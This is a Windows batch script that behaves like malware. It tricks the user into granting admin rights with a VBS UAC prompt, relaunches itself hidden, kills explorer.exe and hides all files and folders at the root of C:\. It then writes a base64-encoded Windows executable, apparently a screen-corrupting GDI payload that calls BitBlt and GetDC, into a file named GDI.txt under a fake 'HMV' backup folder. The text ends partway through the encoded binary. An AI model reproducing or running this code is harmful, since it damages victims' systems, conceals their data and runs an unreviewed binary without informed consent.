@echo off
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else ( goto gotAdmin )
:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"=""
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    rem del "%temp%\getadmin.vbs"
    exit /B
:gotAdmin
pushd "%CD%"
    CD /D "%~dp0"

if not "%minimized%"=="" goto :minimized
set minimized=true
start /min cmd /C "%~dpnx0"
goto :EOF
:minimized
taskkill /f /im explorer.exe
start explorer.exe

cd C:\
attrib +S +H *.* /D

:Folders
md %appdata%\HMV
md %appdata%\HMV\Backup
md %appdata%\HMV\Programs
md %appdata%\HMV\Backup\Desktop
md %appdata%\HMV\Backup\Downloads
md %appdata%\HMV\Backup\Videos
md %appdata%\HMV\Backup\Documents
md %appdata%\HMV\Backup\Music
md %appdata%\HMV\Backup\Pictures
cd %appdata%\HMV\Programs

echo -----BEGIN CERTIFICATE----->GDI.txt
echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAEAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5v>>GDI.txt
echo dCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABZT4EGHS7vVR0u71UdLu9V>>GDI.txt
echo FFZ8VREu71VSUu5UHy7vVVJS6lQPLu9VUlLrVBcu71VSUuxUHi7vVc5c7lQaLu9V>>GDI.txt
echo HS7uVSgu71XcUuZUHC7vVdxSEFUcLu9V3FLtVBwu71VSaWNoHS7vVQAAAAAAAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAAAAFBFAABkhgYAev7MYwAAAAAAAAAA8AAiAAsCDiIAEAAA>>GDI.txt
echo ACAAAAAAAADAEwAAABAAAAAAAEABAAAAABAAAAACAAAGAAAAAAAAAAYAAAAAAAAA>>GDI.txt
echo AIAAAAAEAAAAAAAAAwBggQAAEAAAAAAAABAAAAAAAAAAABAAAAAAAAAQAAAAAAAA>>GDI.txt
echo AAAAABAAAAAAAAAAAAAAAMwoAADcAAAAAGAAAOABAAAAUAAAaAEAAAAAAAAAAAAA>>GDI.txt
echo AHAAADAAAADAIwAAcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAiAABAAQAA>>GDI.txt
echo AAAAAAAAAAAAIAAA0AEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC50ZXh0AAAA>>GDI.txt
echo LA4AAAAQAAAAEAAAAAQAAAAAAAAAAAAAAAAAACAAAGAucmRhdGEAABoQAAAAIAAA>>GDI.txt
echo ABIAAAAUAAAAAAAAAAAAAAAAAABAAABALmRhdGEAAAA4BgAAAEAAAAACAAAAJgAA>>GDI.txt
echo AAAAAAAAAAAAAAAAQAAAwC5wZGF0YQAAaAEAAABQAAAAAgAAACgAAAAAAAAAAAAA>>GDI.txt
echo AAAAAEAAAEAucnNyYwAAAOABAAAAYAAAAAIAAAAqAAAAAAAAAAAAAAAAAABAAABA>>GDI.txt
echo LnJlbG9jAAAwAAAAAHAAAAACAAAALAAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAAAAEiJXCQISIlsJBBIiXQkGEiJfCQgQVZIg+xQM8n/FXYQ>>GDI.txt
echo AAAzyUiL+P8VcxAAALkBAAAAi/D/FWYQAACL6EUz9pD/FXoRAACL2LhnZmZm9+vB>>GDI.txt
echo +gKLwsHoHwPQjQSSA8Ar2P8VWhEAAMdEJEAgAMwARIvOi8hEiXQkOLhnZmZmRIl0>>GDI.txt
echo JDD36UiJfCQoRIvDwfoCi8KJbCQgwegfA9CNBJIDwCvIi9FIi8//FVQPAAD/FQ4R>>GDI.txt
echo AACL2LhnZmZm9+vB+gKLwsHoHwPQjQSSA8Ar2P8V7hAAAMdEJECGAO4ARIvOi8hE>>GDI.txt
echo iXQkOLhnZmZmRIl0JDD36UiJfCQoRIvDwfoCi8KJbCQgwegfA9CNBJIDwCvIi9FI>>GDI.txt
echo i8//FegOAAC5ZAAAAP8VDQ8AAOkY////zMzMzMzMzMzMzMzMzMxmZg8fhAAAAAAA>>GDI.txt
echo SDsNwS4AAHUQSMHBEGb3wf//dQHDSMHJEOmqAgAAzMxAU0iD7CC5AQAAAOi+CwAA>>GDI.txt
echo 6OMGAACLyOjoCwAA6MsGAACL2OgMDAAAuQEAAACJGOhEBAAAhMB0c+g/CQAASI0N>>GDI.txt
echo dAkAAOjfBQAA6KIGAACLyOiFCwAAhcB1UuiiBgAA6OEGAACFwHQMSI0NfgYAAOhh>>GDI.txt
echo CwAA6JwGAADolwYAAOhqBgAAi8jonwsAAOiCBgAAhMB0BehJCwAA6FAGAADoEwgA>>GDI.txt
echo AIXAdQZIg8QgW8O5BwAAAOizBgAAzMzMSIPsKOhnBgAAM8BIg8Qow0iD7CjoPwgA>>GDI.txt
echo AOgWBgAAi8hIg8Qo6U0LAADMzMxIiVwkCEiJdCQQV0iD7DC5AQAAAOgvAwAAhMAP>>GDI.txt
echo hDYBAABAMvZAiHQkIOjeAgAAitiLDTYzAACD+QEPhCMBAACFyXVKxwUfMwAAAQAA>>GDI.txt
echo AEiNFaAPAABIjQ2BDwAA6K4KAACFwHQKuP8AAADp2QAAAEiNFV8PAABIjQ1IDwAA>>GDI.txt
echo 6IcKAADHBeEyAAACAAAA6whAtgFAiHQkIIrL6BwEAADoywUAAEiL2EiDOAB0HkiL>>GDI.txt
echo yOhuAwAAhMB0EkUzwEGNUAIzyUiLA/8V1A4AAOinBQAASIvYSIM4AHQUSIvI6EID>>GDI.txt
echo AACEwHQISIsL6FQKAADoEwoAAEiL+Og1CgAASIsY6CcKAABMi8dIi9OLCOiw/P//>>GDI.txt
echo i9joxQYAAITAdFVAhPZ1BegRCgAAM9KxAeiyAwAAi8PrGYvY6KMGAACEwHQ7gHwk>>GDI.txt
echo IAB1BejzCQAAi8NIi1wkQEiLdCRISIPEMF/DuQcAAADoIwUAAJC5BwAAAOgYBQAA>>GDI.txt
echo i8vooQkAAJCLy+ifCQAAkEiD7Cjo1wMAAEiDxCjpcv7//8zMQFNIg+wgSIvZM8n/>>GDI.txt
echo FTMMAABIi8v/FSIMAAD/FUQMAABIi8i6CQQAwEiDxCBbSP8lOAwAAEiJTCQISIPs>>GDI.txt
echo OLkXAAAA/xUsDAAAhcB0B7kCAAAAzSlIjQ2yLAAA6KkAAABIi0QkOEiJBZktAABI>>GDI.txt
echo jUQkOEiDwAhIiQUpLQAASIsFgi0AAEiJBfMrAABIi0QkQEiJBfcsAADHBc0rAAAJ>>GDI.txt
echo BADAxwXHKwAAAQAAAMcF0SsAAAEAAAC4CAAAAEhrwABIjQ3JKwAASMcEAQIAAAC4>>GDI.txt
echo CAAAAEhrwABIiw1ZKwAASIlMBCC4CAAAAEhrwAFIiw08KwAASIlMBCBIjQ2QDQAA>>GDI.txt
echo 6P/+//9Ig8Q4w8zMQFNWV0iD7EBIi9n/FZsLAABIi7P4AAAAM/9FM8BIjVQkYEiL>>GDI.txt
echo zv8VIQsAAEiFwHQ5SINkJDgASI1MJGhIi1QkYEyLyEiJTCQwTIvGSI1MJHBIiUwk>>GDI.txt
echo KDPJSIlcJCD/FeIKAAD/x4P/AnyxSIPEQF9eW8PMzMxIg+wo6KcHAACFwHQhZUiL>>GDI.txt
echo BCUwAAAASItICOsFSDvIdBQzwPBID7ENPDAAAHXuMsBIg8Qow7AB6/fMzMxAU0iD>>GDI.txt
echo 7CAPtgUnMAAAhcm7AQAAAA9Ew4gFFzAAAOimBQAA6L0CAACEwHUEMsDrFOiwAgAA>>GDI.txt
echo hMB1CTPJ6KUCAADr6orDSIPEIFvDzMzMQFNIg+wggD3cLwAAAIvZdWeD+QF3augN>>GDI.txt
echo BwAAhcB0KIXbdSRIjQ3GLwAA6JMHAACFwHUQSI0Nzi8AAOiDBwAAhcB0LjLA6zNm>>GDI.txt
echo D28FSQwAAEiDyP/zD38FlS8AAEiJBZ4vAADzD38Fni8AAEiJBacvAADGBXEvAAAB>>GDI.txt
echo sAFIg8QgW8O5BQAAAOhmAgAAzMxIg+wYTIvBuE1aAABmOQWJ6f//dXhIYw286f//>>GDI.txt
echo SI0Veen//0gDyoE5UEUAAHVfuAsCAABmOUEYdVRMK8IPt1EUSIPCGEgD0Q+3QQZI>>GDI.txt
echo jQyATI0MykiJFCRJO9F0GItKDEw7wXIKi0IIA8FMO8ByCEiDwijr3zPSSIXSdQQy>>GDI.txt
echo wOsUg3okAH0EMsDrCrAB6wYywOsCMsBIg8QYw0BTSIPsIIrZ6PcFAAAz0oXAdAuE>>GDI.txt
echo 23UHSIcVni4AAEiDxCBbw0BTSIPsIIA9ky4AAACK2XQEhNJ1DOg2AQAAisvoLwEA>>GDI.txt
echo ALABSIPEIFvDzMzMQFNIg+wgSIM9bi4AAP9Ii9l1B+hCBgAA6w9Ii9NIjQ1YLgAA>>GDI.txt
echo 6CsGAAAz0oXASA9E00iLwkiDxCBbw8zMSIPsKOi7////SPfYG8D32P/ISIPEKMPM>>GDI.txt
echo SIlcJCBVSIvsSIPsIEiLBVQoAABIuzKi3y2ZKwAASDvDdXRIg2UYAEiNTRj/FaYI>>GDI.txt
echo AABIi0UYSIlFEP8VoAgAAIvASDFFEP8VbAgAAIvASI1NIEgxRRD/FVQIAACLRSBI>>GDI.txt
echo jU0QSMHgIEgzRSBIM0UQSDPBSLn///////8AAEgjwUi5M6LfLZkrAABIO8NID0TB>>GDI.txt
echo SIkF0ScAAEiLXCRISPfQSIkFuicAAEiDxCBdwzPAw8y4AQAAAMPMzLgAQAAAw8zM>>GDI.txt
echo SI0NmS0AAEj/JQIIAADMzLABw8zCAADMSI0FkS0AAMNIjQWRLQAAw0iD7Cjo5///>>GDI.txt
echo /0iDCCTo5v///0iDCAJIg8Qow8wzwDkFaCcAAA+UwMNIjQV5LQAAw0iNBWktAADD>>GDI.txt
echo gyVZLQAAAMNIiVwkCFVIjawkQPv//0iB7MAFAACL2bkXAAAA/xVeBwAAhcB0BIvL>>GDI.txt
echo zSm5AwAAAOjE////M9JIjU3wQbjQBAAA6BUEAABIjU3w/xVxBwAASIud6AAAAEiN>>GDI.txt
echo ldgEAABIi8tFM8D/FfcGAABIhcB0PEiDZCQ4AEiNjeAEAABIi5XYBAAATIvISIlM>>GDI.txt
echo JDBMi8NIjY3oBAAASIlMJChIjU3wSIlMJCAzyf8VrgYAAEiLhcgEAABIjUwkUEiJ>>GDI.txt
echo hegAAAAz0kiNhcgEAABBuJgAAABIg8AISImFiAAAAOh+AwAASIuFyAQAAEiJRCRg>>GDI.txt
echo x0QkUBUAAEDHRCRUAQAAAP8VogYAAIP4AUiNRCRQSIlEJEBIjUXwD5TDSIlEJEgz>>GDI.txt
echo yf8VMQYAAEiNTCRA/xUeBgAAhcB1DITbdQiNSAPovv7//0iLnCTQBQAASIHEwAUA>>GDI.txt
echo AF3DzOkz/v//zMzMSIPsKDPJ/xU4BgAASIXAdDm5TVoAAGY5CHUvSGNIPEgDyIE5>>GDI.txt
echo UEUAAHUguAsCAABmOUEYdRWDuYQAAAAOdgyDufgAAAAAD5XA6wIywEiDxCjDzMzM>>GDI.txt
echo SI0NCQAAAEj/JZoFAADMzEiJXCQIV0iD7CBIixlIi/mBO2NzbeB1HIN7GAR1FotT>>GDI.txt
echo II2C4Pps5oP4AnYVgfoAQJkBdA1Ii1wkMDPASIPEIF/D6FACAABIiRhIi18I6EoC>>GDI.txt
echo AABIiRjo0gIAAMzMSIlcJAhXSIPsIEiNHdsMAABIjT3UDAAA6xJIiwNIhcB0Bv8V>>GDI.txt
echo 3AYAAEiDwwhIO99y6UiLXCQwSIPEIF/DSIlcJAhXSIPsIEiNHa8MAABIjT2oDAAA>>GDI.txt
echo 6xJIiwNIhcB0Bv8VoAYAAEiDwwhIO99y6UiLXCQwSIPEIF/DSIlcJBBIiXQkGFdI>>GDI.txt
echo g+wQM8AzyQ+iRIvBRTPbRIvSQYHwbnRlbEGB8mluZUlEi8uL8DPJQY1DAUUL0A+i>>GDI.txt
echo QYHxR2VudYkEJEUL0YlcJASL+YlMJAiJVCQMdVtIgw1zJAAA/yXwP/8PSMcFWyQA>>GDI.txt
echo AACAAAA9wAYBAHQoPWAGAgB0IT1wBgIAdBoFsPn8/4P4IHckSLkBAAEAAQAAAEgP>>GDI.txt
echo o8FzFESLBSkqAABBg8gBRIkFHioAAOsHRIsFFSoAALgHAAAARI1I+zvwfCYzyQ+i>>GDI.txt
echo iQQkRIvbiVwkBIlMJAiJVCQMD7rjCXMKRQvBRIkF4ikAAMcFzCMAAAEAAABEiQ3J>>GDI.txt
echo IwAAD7rnFA+DkQAAAESJDbQjAAC7BgAAAIkdrSMAAA+65xtzeQ+65xxzczPJDwHQ>>GDI.txt
echo SMHiIEgL0EiJVCQgSItEJCAiwzrDdVeLBX8jAACDyAjHBW4jAAADAAAAiQVsIwAA>>GDI.txt
echo QfbDIHQ4g8ggxwVVIwAABQAAAIkFUyMAALgAAAPQRCPYRDvYdRhIi0QkICTgPOB1>>GDI.txt
echo DYMNNCMAAECJHSojAABIi1wkKDPASIt0JDBIg8QQX8MzwDkFKCMAAA+VwMPMzMzM>>GDI.txt
echo /yWyAwAA/yWUAwAA/yWWAwAA/yWYAwAA/yXyAwAA/yX0AwAA/yXGAwAA/yUgBAAA>>GDI.txt
echo /yVKBAAA/yU8BAAA/yUuBAAA/yUgBAAA/yUSBAAA/yUEBAAA/yVGBAAA/yXoAwAA>>GDI.txt
echo /yXaAwAA/yXMAwAA/yW2AwAA/yUQBAAA/yViAwAA/yVMAwAA/yUOBAAA/yVwAwAA>>GDI.txt
echo /yWKAwAA/yWUAwAA/yVmAwAA/yUYAwAAzMzMzMzMzMzMzMzMzMxmZg8fhAAAAAAA>>GDI.txt
echo /+DMzMzMzMzMzMzMzMzMzMzMzMzMzGZmDx+EAAAAAAD/JeoDAABAVUiD7CBIi+pI>>GDI.txt
echo iwFIi9GLCOgc////kEiDxCBdw8xAVUiL6kiLATPJgTgFAADAD5TBi8Fdw8wAAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC2KwAAAAAAAAAAAAAAAAAA>>GDI.txt
echo 9C4AAAAAAAAQLwAAAAAAAOAuAAAAAAAAxi4AAAAAAAB4KwAAAAAAAC4vAAAAAAAA>>GDI.txt
echo Qi8AAAAAAABWLwAAAAAAAHIvAAAAAAAAjC8AAAAAAAD8LwAAAAAAAOgvAAAAAAAA>>GDI.txt
echo 0i8AAAAAAAC4LwAAAAAAAKIvAAAAAAAAsi4AAAAAAAAAAAAAAAAAAKIrAAAAAAAA>>GDI.txt
echo jisAAAAAAAAAAAAAAAAAAOIrAAAAAAAA+CsAAAAAAAAWLAAAAAAAAMorAAAAAAAA>>GDI.txt
echo EDAAAAAAAAAAAAAAAAAAAHotAAAAAAAAAAAAAAAAAABkLQAAAAAAAAAAAAAAAAAA>>GDI.txt
echo XCwAAAAAAAAAAAAAAAAAAJotAAAAAAAA4C0AAAAAAAA6LAAAAAAAAEwsAAAAAAAA>>GDI.txt
echo ti0AAAAAAAAsLQAAAAAAANItAAAAAAAAIi0AAAAAAAAULQAAAAAAAAYtAAAAAAAA>>GDI.txt
echo cCwAAAAAAADwLAAAAAAAAOgsAAAAAAAA2iwAAAAAAADOLAAAAAAAAKwsAAAAAAAA>>GDI.txt
echo iiwAAAAAAAA2LQAAAAAAAAAAAAAAAAAAii0AAAAAAAD4LAAAAAAAAAAAAAAAAAAA>>GDI.txt
echo MiwAAAAAAAAAAAAAAAAAAHQYAEABAAAAdBgAQAEAAADQHQBAAQAAAPAdAEABAAAA>>GDI.txt
echo 8B0AQAEAAAAAAAAAAAAAALIdAEABAAAAAAAAAAAAAAAoEgBAAQAAAAAAAAAAAAAA>>GDI.txt
echo AAAAAAAAAABgEQBAAQAAABgSAEABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAAAAEBAAEABAAAA4EAAQAEAAAD/////////////////////>>GDI.txt
echo QAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAhAAEABAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAAAANAhAEABAAAA4CEAQAEAAAAAAAAAAAAAAAAAAAAAAAAA>>GDI.txt
echo AAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAAAAIAkAEABAAAAAAAAAAAAAAAAAAAAAAAAANghAEABAAAA>>GDI.txt
echo 6CEAQAEAAADwIQBAAQAAAPghAEABAAAAACIAQAEAAAAAAAAAev7MYwAAAAACAAAA>>GDI.txt
echo TQAAANQkAADUGAAAAAAAAHr+zGMAAAAADAAAABQAAAAkJQAAJBkAAAAAAAB6/sxj>>GDI.txt
echo AAAAAA0AAACEAgAAOCUAADgZAAAAAAAAev7MYwAAAAAOAAAAAAAAAAAAAAAAAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYAAAAAoACgJgkAAAsAAAA>>GDI.txt
echo xCQAABAAAAAzFAAArxQAAMQUAABdFQAAcxUAABMXAAByGQAApBkAAIccAACMHAAA>>GDI.txt
echo 1hwAAGARAACwCwAA9h0AADYAAABSU0RTHHMcFUfrp0yDY4noeeptaBEAAABDOlxV>>GDI.txt
echo c2Vyc1xNaW5qYWVcc291cmNlXHJlcG9zXEdESVx4NjRcUmVsZWFzZVxHREkucGRi>>GDI.txt
echo AAAAAAAAAAAdAAAAHQAAAAEAAAAcAAAAR0NUTAAQAADADQAALnRleHQkbW4AAAAA>>GDI.txt
echo wB0AADYAAAAudGV4dCRtbiQwMAD2HQAANgAAAC50ZXh0JHgAACAAANABAAAuaWRh>>GDI.txt
echo dGEkNQAAAADQIQAAOAAAAC4wMGNmZwAACCIAAAgAAAAuQ1JUJFhDQQAAAAAQIgAA>>GDI.txt
echo CAAAAC5DUlQkWENBQQAAABgiAAAIAAAALkNSVCRYQ1oAAAAAICIAAAgAAAAuQ1JU>>GDI.txt
echo JFhJQQAAAAAoIgAACAAAAC5DUlQkWElBQQAAADAiAAAIAAAALkNSVCRYSUFDAAAA>>GDI.txt
echo OCIAAAgAAAAuQ1JUJFhJWgAAAABAIgAACAAAAC5DUlQkWFBBAAAAAEgiAAAIAAAA>>GDI.txt
echo LkNSVCRYUFoAAAAAUCIAAAgAAAAuQ1JUJFhUQQAAAABYIgAACAAAAC5DUlQkWFRa>>GDI.txt
echo AAAAAGAiAAAgAgAALnJkYXRhAACAJAAAVAAAAC5yZGF0YSR2b2x0bWQAAADUJAAA>>GDI.txt
echo 7AIAAC5yZGF0YSR6enpkYmcAAADAJwAACAAAAC5ydGMkSUFBAAAAAMgnAAAIAAAA>>GDI.txt
echo LnJ0YyRJWloAAAAA0CcAAAgAAAAucnRjJFRBQQAAAADYJwAACAAAAC5ydGMkVFpa>>GDI.txt
echo AAAAAOAnAADsAAAALnhkYXRhAADMKAAAyAAAAC5pZGF0YSQyAAAAAJQpAAAUAAAA>>GDI.txt
echo LmlkYXRhJDMAAAAAqCkAANABAAAuaWRhdGEkNAAAAAB4KwAAogQAAC5pZGF0YSQ2>>GDI.txt
echo AAAAAABAAABAAAAALmRhdGEAAABAQAAA+AUAAC5ic3MAAAAAAFAAAGgBAAAucGRh>>GDI.txt
echo dGEAAABgAABgAAAALnJzcmMkMDEAAAAAYGAAAIABAAAucnNyYyQwMgAAAAAAAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABGgoAGnQPABpkDgAaVA0A>>GDI.txt
echo GjQMABqSFuABAAAAAQYCAAYyAjABBAEABEIAAAkPBgAPZAkADzQIAA9SC3AQHQAA>>GDI.txt
echo AgAAAG0SAAByEwAA9h0AAHITAACmEwAAuBMAAPYdAAByEwAAAQYCAAYyAlABCQEA>>GDI.txt
echo CWIAAAEIBAAIcgRwA2ACMAkEAQAEIgAAEB0AAAEAAABrFgAA9RYAABQeAAD1FgAA>>GDI.txt
echo AQIBAAJQAAABDQQADTQJAA0yBlABFQUAFTS6ABUBuAAGUAAAAQoEAAo0BgAKMgZw>>GDI.txt
echo AQ8GAA9kBgAPNAUADxILcAEAAAAAAAAAAQAAALgpAAAAAAAAAAAAAIArAAAQIAAA>>GDI.txt
echo QCoAAAAAAAAAAAAAqisAAJggAACoKQAAAAAAAAAAAADAKwAAACAAAFgqAAAAAAAA>>GDI.txt
echo AAAAACAsAACwIAAAaCsAAAAAAAAAAAAA7C0AAMAhAAC4KgAAAAAAAAAAAAAOLgAA>>GDI.txt
echo ECEAAKgqAAAAAAAAAAAAADAuAAAAIQAAUCsAAAAAAAAAAAAAUC4AAKghAACYKgAA>>GDI.txt
echo AAAAAAAAAABwLgAA8CAAAIgqAAAAAAAAAAAAAJIuAADgIAAAAAAAAAAAAAAAAAAA>>GDI.txt
echo AAAAAAAAAAC2KwAAAAAAAAAAAAAAAAAA9C4AAAAAAAAQLwAAAAAAAOAuAAAAAAAA>>GDI.txt
echo xi4AAAAAAAB4KwAAAAAAAC4vAAAAAAAAQi8AAAAAAABWLwAAAAAAAHIvAAAAAAAA>>GDI.txt
echo jC8AAAAAAAD8LwAAAAAAAOgvAAAAAAAA0i8AAAAAAAC4LwAAAAAAAKIvAAAAAAAA>>GDI.txt
echo si4AAAAAAAAAAAAAAAAAAKIrAAAAAAAAjisAAAAAAAAAAAAAAAAAAOIrAAAAAAAA>>GDI.txt
echo +CsAAAAAAAAWLAAAAAAAAMorAAAAAAAAEDAAAAAAAAAAAAAAAAAAAHotAAAAAAAA>>GDI.txt
echo AAAAAAAAAABkLQAAAAAAAAAAAAAAAAAAXCwAAAAAAAAAAAAAAAAAAJotAAAAAAAA>>GDI.txt
echo 4C0AAAAAAAA6LAAAAAAAAEwsAAAAAAAAti0AAAAAAAAsLQAAAAAAANItAAAAAAAA>>GDI.txt
echo Ii0AAAAAAAAULQAAAAAAAAYtAAAAAAAAcCwAAAAAAADwLAAAAAAAAOgsAAAAAAAA>>GDI.txt
echo 2iwAAAAAAADOLAAAAAAAAKwsAAAAAAAAiiwAAAAAAAA2LQAAAAAAAAAAAAAAAAAA>>GDI.txt
echo ii0AAAAAAAD4LAAAAAAAAAAAAAAAAAAAMiwAAAAAAAAAAAAAAAAAAKcFU2xlZXAA>>GDI.txt
echo S0VSTkVMMzIuZGxsAADIAUdldFN5c3RlbU1ldHJpY3MAAEIBR2V0REMAVVNFUjMy>>GDI.txt
echo LmRsbAAAEwBCaXRCbHQAAEdESTMyLmRsbAAIAF9fQ19zcGVjaWZpY19oYW5kbGVy>>GDI.txt
echo AAAbAF9fY3VycmVudF9leGNlcHRpb24AHABfX2N1cnJlbnRfZXhjZXB0aW9uX2Nv>>GDI.txt
echo bnRleHQAPgBtZW1zZXQAAFZDUlVOVElNRTE0MC5kbGwAABsAcmFuZAAAQABfc2Vo>>GDI.txt
echo X2ZpbHRlcl9leGUAQgBfc2V0X2FwcF90eXBlAAkAX19zZXR1c2VybWF0aGVycgAA>>GDI.txt
echo GABfY29uZmlndXJlX25hcnJvd19hcmd2AAAzAF9pbml0aWFsaXplX25hcnJvd19l>>GDI.txt
echo bnZpcm9ubWVudAAAKABfZ2V0X2luaXRpYWxfbmFycm93X2Vudmlyb25tZW50ADYA>>GDI.txt
echo X2luaXR0ZXJtADcAX2luaXR0ZXJtX2UAVQBleGl0AAAjAF9leGl0AFQAX3NldF9m>>GDI.txt
echo bW9kZQAABABfX3BfX19hcmdjAAAFAF9fcF9fX2FyZ3YAABYAX2NleGl0AAAVAF9j>>GDI.txt
echo X2V4aXQAPQBfcmVnaXN0ZXJfdGhyZWFkX2xvY2FsX2V4ZV9hdGV4aXRfY2FsbGJh>>GDI.txt
echo Y2sAAAgAX2NvbmZpZ3RocmVhZGxvY2FsZQAWAF9zZXRfbmV3X21vZGUAAQBfX3Bf>>GDI.txt
echo X2NvbW1vZGUAADQAX2luaXRpYWxpemVfb25leGl0X3RhYmxlAAA8AF9yZWdpc3Rl>>GDI.txt
echo cl9vbmV4aXRfZnVuY3Rpb24AHgBfY3J0X2F0ZXhpdABnAHRlcm1pbmF0ZQBhcGkt>>GDI.txt
echo bXMtd2luLWNydC11dGlsaXR5LWwxLTEtMC5kbGwAYXBpLW1zLXdpbi1jcnQtcnVu>>GDI.txt
echo dGltZS1sMS0xLTAuZGxsAGFwaS1tcy13aW4tY3J0LW1hdGgtbDEtMS0wLmRsbAAA>>GDI.txt
echo YXBpLW1zLXdpbi1jcnQtc3RkaW8tbDEtMS0wLmRsbABhcGktbXMtd2luLWNydC1s>>GDI.txt
echo b2NhbGUtbDEtMS0wLmRsbAAAYXBpLW1zLXdpbi1jcnQtaGVhcC1sMS0xLTAuZGxs>>GDI.txt
echo AADpBFJ0bENhcHR1cmVDb250ZXh0APEEUnRsTG9va3VwRnVuY3Rpb25FbnRyeQAA>>GDI.txt
echo +ARSdGxWaXJ0dWFsVW53aW5kAADYBVVuaGFuZGxlZEV4Y2VwdGlvbkZpbHRlcgAA>>GDI.txt
echo lwVTZXRVbmhhbmRsZWRFeGNlcHRpb25GaWx0ZXIAKgJHZXRDdXJyZW50UHJvY2Vz>>GDI.txt
echo cwC2BVRlcm1pbmF0ZVByb2Nlc3MAAJ4DSXNQcm9jZXNzb3JGZWF0dXJlUHJlc2Vu>>GDI.txt
echo dABkBFF1ZXJ5UGVyZm9ybWFuY2VDb3VudGVyACsCR2V0Q3VycmVudFByb2Nlc3NJ>>GDI.txt
echo ZAAvAkdldEN1cnJlbnRUaHJlYWRJZAAAAQNHZXRTeXN0ZW1UaW1lQXNGaWxlVGlt>>GDI.txt
echo ZQCBA0luaXRpYWxpemVTTGlzdEhlYWQAlwNJc0RlYnVnZ2VyUHJlc2VudACMAkdl>>GDI.txt
echo dE1vZHVsZUhhbmRsZVcAADwAbWVtY3B5AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>GDI.txt
